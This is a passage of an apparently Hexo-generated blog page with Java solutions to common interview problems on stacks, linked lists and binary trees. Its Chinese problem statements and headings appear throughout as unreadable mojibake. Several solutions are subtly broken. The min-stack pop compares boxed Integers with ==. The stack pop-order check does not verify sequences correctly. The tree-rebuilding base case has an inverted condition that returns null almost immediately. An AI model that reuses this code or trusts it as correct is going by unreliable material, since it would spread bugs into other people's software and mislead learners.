ˆçš„æ•°æ®ç»“æ„ï¼Œè¯·åœ¨è¯¥ç±»å‹ä¸­å®ç°ä¸€ä¸ªèƒ½å¤Ÿå¾—åˆ°æ ˆä¸­æ‰€å«æœ€å°å…ƒç´ çš„minå‡½æ•°ï¼ˆæ—¶é—´å¤æ‚åº¦åº”ä¸ºOï¼ˆ1ï¼‰ï¼‰ã€‚</p><p>æ³¨æ„ï¼šä¿è¯æµ‹è¯•ä¸­ä¸ä¼šå½“æ ˆä¸ºç©ºçš„æ—¶å€™ï¼Œå¯¹æ ˆè°ƒç”¨pop()æˆ–è€…min()æˆ–è€…top()æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Integer&gt; ele=<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">    Stack&lt;Integer&gt; min=<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(min.size()==<span class="number">0</span>||node&lt;=min.peek()) min.push(node);</span><br><span class="line">        ele.push(node);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(ele.peek()==min.peek()) min.pop();</span><br><span class="line">        ele.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ele.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> min.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ ˆçš„å‹å…¥å¼¹å‡ºåºåˆ—">æ ˆçš„å‹å…¥å¼¹å‡ºåºåˆ— âˆš</span></h2><p>è¾“å…¥ä¸¤ä¸ªæ•´æ•°åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—è¡¨ç¤ºæ ˆçš„å‹å…¥é¡ºåºï¼Œè¯·åˆ¤æ–­ç¬¬äºŒä¸ªåºåˆ—æ˜¯å¦å¯èƒ½ä¸ºè¯¥æ ˆçš„å¼¹å‡ºé¡ºåºã€‚å‡è®¾å‹å…¥æ ˆçš„æ‰€æœ‰æ•°å­—å‡ä¸ç›¸ç­‰ã€‚ä¾‹å¦‚åºåˆ—1,2,3,4,5æ˜¯æŸæ ˆçš„å‹å…¥é¡ºåºï¼Œåºåˆ—4,5,3,2,1æ˜¯è¯¥å‹æ ˆåºåˆ—å¯¹åº”çš„ä¸€ä¸ªå¼¹å‡ºåºåˆ—ï¼Œä½†4,3,5,1,2å°±ä¸å¯èƒ½æ˜¯è¯¥å‹æ ˆåºåˆ—çš„å¼¹å‡ºåºåˆ—ã€‚ï¼ˆæ³¨æ„ï¼šè¿™ä¸¤ä¸ªåºåˆ—çš„é•¿åº¦æ˜¯ç›¸ç­‰çš„ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">IsPopOrder</span><span class="params">(<span class="type">int</span> [] pushA,<span class="type">int</span> [] popA)</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; s = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;pushA.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pushA[i]!=popA[j])&#123;</span><br><span class="line">            s.push(pushA[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.pop()==popA[j]) j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j==popA.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="é“¾è¡¨">é“¾è¡¨</span></h1><h2><span id="é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹">é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹ âˆš</span></h2><p>ç»™ä¸€ä¸ªé“¾è¡¨ï¼Œè‹¥å…¶ä¸­åŒ…å«ç¯ï¼Œè¯·æ‰¾å‡ºè¯¥é“¾è¡¨çš„ç¯çš„å…¥å£ç»“ç‚¹ï¼Œå¦åˆ™ï¼Œè¾“å‡ºnullã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">EntryNodeOfLoop</span><span class="params">(ListNode pHead)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pHead==<span class="literal">null</span>||pHead.next==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        ListNode fast=pHead;</span><br><span class="line">        ListNode slow=pHead;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast==slow)&#123;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">while</span>(pHead!=fast)&#123;                    </span><br><span class="line">                    pHead=pHead.next;</span><br><span class="line">                    fast=fast.next;</span><br><span class="line">                    <span class="keyword">if</span>(fast==pHead)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> pHead;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹-">åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹ -</span></h2><p>åœ¨ä¸€ä¸ªæ’åºçš„é“¾è¡¨ä¸­ï¼Œå­˜åœ¨é‡å¤çš„ç»“ç‚¹ï¼Œè¯·åˆ é™¤è¯¥é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹ï¼Œé‡å¤çš„ç»“ç‚¹ä¸ä¿ç•™ï¼Œè¿”å›é“¾è¡¨å¤´æŒ‡é’ˆã€‚ ä¾‹å¦‚ï¼Œé“¾è¡¨1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 å¤„ç†åä¸º 1-&gt;2-&gt;5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">deleteDuplication</span><span class="params">(ListNode pHead)</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       head.next=pHead;</span><br><span class="line">       ListNode pre=head,now=pHead;</span><br><span class="line">       <span class="keyword">while</span>(now!=<span class="literal">null</span>&amp;&amp;now.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(now.next.val==now.val)&#123;</span><br><span class="line">               <span class="keyword">while</span>(now.next!=<span class="literal">null</span>&amp;&amp;now.next.val==now.val)&#123;</span><br><span class="line">                   now=now.next;</span><br><span class="line">               &#125;</span><br><span class="line">              now=now.next;</span><br><span class="line">               pre.next=now;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               pre=pre.next;</span><br><span class="line">               now=now.next;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> head.next;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ä¸åˆ é™¤é‡å¤èŠ‚ç‚¹çš„è¯ï¼Œå°†now&#x3D;now.nextæ³¨é‡Šå°±å¯ä»¥äº†ã€‚</p><h2><span id="åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨">åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨ âˆš</span></h2><p>è¾“å…¥ä¸¤ä¸ªå•è°ƒé€’å¢çš„é“¾è¡¨ï¼Œè¾“å‡ºä¸¤ä¸ªé“¾è¡¨åˆæˆåçš„é“¾è¡¨ï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦åˆæˆåçš„é“¾è¡¨æ»¡è¶³å•è°ƒä¸å‡è§„åˆ™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">Merge</span><span class="params">(ListNode list1,ListNode list2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode now=root;</span><br><span class="line">        <span class="keyword">while</span>(list1!=<span class="literal">null</span>&amp;&amp;list2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(list1.val&lt;=list2.val)&#123;</span><br><span class="line">                now.next=list1;</span><br><span class="line">                list1=list1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                now.next=list2;</span><br><span class="line">                list2=list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            now=now.next;</span><br><span class="line">        &#125;</span><br><span class="line">        now.next= list1==<span class="literal">null</span>?list2:list1;</span><br><span class="line">        <span class="keyword">return</span> root.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªç»“ç‚¹">é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªç»“ç‚¹ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">FindKthToTail</span><span class="params">(ListNode head,<span class="type">int</span> k)</span> &#123;</span><br><span class="line">        ListNode root=head;      </span><br><span class="line">        <span class="keyword">while</span>(k--&gt;<span class="number">0</span>&amp;&amp;root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            root=root.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=<span class="number">0</span>)<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">            root=root.next;</span><br><span class="line">            head=head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="åè½¬é“¾è¡¨">åè½¬é“¾è¡¨ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        ListNode root=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> head.next;</span><br><span class="line">            head.next=root.next;</span><br><span class="line">            root.next=head;</span><br><span class="line">            head=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="å¤æ‚é“¾è¡¨çš„å¤åˆ¶">å¤æ‚é“¾è¡¨çš„å¤åˆ¶ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> RandomListNode <span class="title function_">Clone</span><span class="params">(RandomListNode pHead)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        RandomListNode head=pHead;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;          </span><br><span class="line">            RandomListNode tmp=<span class="keyword">new</span> <span class="title class_">RandomListNode</span>(head.label);            </span><br><span class="line">            tmp.next=head.next;</span><br><span class="line">            head.next=tmp;</span><br><span class="line">            head=tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head=pHead;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head.random!=<span class="literal">null</span>)&#123;</span><br><span class="line">                RandomListNode ran=head.random;</span><br><span class="line">                head.next.random=ran.next;</span><br><span class="line">            &#125;</span><br><span class="line">            head=head.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head=pHead;</span><br><span class="line">        RandomListNode res=head.next;</span><br><span class="line">        <span class="keyword">while</span>(head.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            RandomListNode next=head.next;</span><br><span class="line">            head.next=head.next.next;</span><br><span class="line">            head=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ ‘">æ ‘</span></h1><h2><span id="é‡å»ºäºŒå‰æ ‘">é‡å»ºäºŒå‰æ ‘ âˆš</span></h2><p>è¾“å…¥æŸäºŒå‰æ ‘çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœï¼Œè¯·é‡å»ºå‡ºè¯¥äºŒå‰æ ‘ã€‚å‡è®¾è¾“å…¥çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœä¸­éƒ½ä¸å«é‡å¤çš„æ•°å­—ã€‚ä¾‹å¦‚è¾“å…¥å‰åºéå†åºåˆ—{1,2,4,7,3,5,6,8}å’Œä¸­åºéå†åºåˆ—{4,7,2,1,5,3,8,6}ï¼Œåˆ™é‡å»ºäºŒå‰æ ‘å¹¶è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> build(preorder,<span class="number">0</span>,preorder.length-<span class="number">1</span>,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> TreeNode <span class="title function_">build</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> preS, <span class="type">int</span> preE, <span class="type">int</span>[] inorder, <span class="type">int</span> inS, <span class="type">int</span> inE)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(preE&gt;preS||inE&gt;inS) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    TreeNode root=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[preS]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inS; i &lt;=inE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==preorder[preS])&#123;</span><br><span class="line">            root.left=build(preorder,preS+<span class="number">1</span>,preS+i-inS,inorder,inS,i-<span class="number">1</span>);</span><br><span class="line">            root.right=build(preorder,preS+i-inS+<span class="number">1</span>,preE,inorder,i+<span class="number">1</span>,inE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æ ‘çš„é•œè±¡">äºŒå‰æ ‘çš„é•œè±¡ âˆš</span></h2><p>æ“ä½œç»™å®šçš„äºŒå‰æ ‘ï¼Œå°†å…¶å˜æ¢ä¸ºæºäºŒå‰æ ‘çš„é•œåƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">äºŒå‰æ ‘çš„é•œåƒå®šä¹‰ï¼šæºäºŒå‰æ ‘ </span><br><span class="line">        8</span><br><span class="line">       /  \</span><br><span class="line">      6   10</span><br><span class="line">     / \  / \</span><br><span class="line">    5  7 9 11</span><br><span class="line">    é•œåƒäºŒå‰æ ‘</span><br><span class="line">        8</span><br><span class="line">       /  \</span><br><span class="line">      10   6</span><br><span class="line">     / \  / \</span><br><span class="line">    11 9 7  5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Mirror</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    swap(root);</span><br><span class="line">    Mirror(root.left);</span><br><span class="line">    Mirror(root.right);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">t</span> <span class="operator">=</span> root.left;</span><br><span class="line">    root.left = root.right;</span><br><span class="line">    root.right = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘">ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘ âˆš</span></h2><p>ä»ä¸Šå¾€ä¸‹æ‰“å°å‡ºäºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ŒåŒå±‚èŠ‚ç‚¹ä»å·¦è‡³å³æ‰“å°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">PrintFromTopToBottom</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    q.offer(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        TreeNode tmp=q.poll();</span><br><span class="line">        res.add(tmp.val);</span><br><span class="line">        <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) q.offer(tmp.left);</span><br><span class="line">        <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) q.offer(tmp.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘">æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘ âˆš</span></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°æŒ‰ç…§ä¹‹å­—å½¢æ‰“å°äºŒå‰æ ‘ï¼Œå³ç¬¬ä¸€è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œç¬¬äºŒå±‚æŒ‰ç…§ä»å³è‡³å·¦çš„é¡ºåºæ‰“å°ï¼Œç¬¬ä¸‰è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œå…¶ä»–è¡Œä»¥æ­¤ç±»æ¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt; &gt; Print(TreeNode pRoot) &#123;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="keyword">if</span>(pRoot==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    q.add(pRoot);</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">        ArrayList&lt;Integer&gt; memo = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> q.poll();</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">1</span>) memo.add(tmp.val);</span><br><span class="line">            <span class="keyword">else</span> memo.add(<span class="number">0</span>,tmp.val);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) q.offer(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) q.offer(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        flag=flag*-<span class="number">1</span>;</span><br><span class="line">        res.add(memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å¯¹ç§°çš„äºŒå‰æ ‘">å¯¹ç§°çš„äºŒå‰æ ‘ âˆš</span></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­ä¸€é¢—äºŒå‰æ ‘æ˜¯ä¸æ˜¯å¯¹ç§°çš„ã€‚æ³¨æ„ï¼Œå¦‚æœä¸€ä¸ªäºŒå‰æ ‘åŒæ­¤äºŒå‰æ ‘çš„é•œåƒæ˜¯åŒæ ·çš„ï¼Œå®šä¹‰å…¶ä¸ºå¯¹ç§°çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">isSymmetrical</span><span class="params">(TreeNode pRoot)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(pRoot==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> isSymmetrical(pRoot.left,pRoot.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isSymmetrical</span><span class="params">(TreeNode p,TreeNode q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==<span class="literal">null</span>&amp;&amp;p==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(q==<span class="literal">null</span>||p==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> q.val==p.val&amp;&amp;isSymmetrical(q.left,p.right)&amp;&amp;isSymmetrical(q.right,p.left);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æ ‘çš„æ·±åº¦">äºŒå‰æ 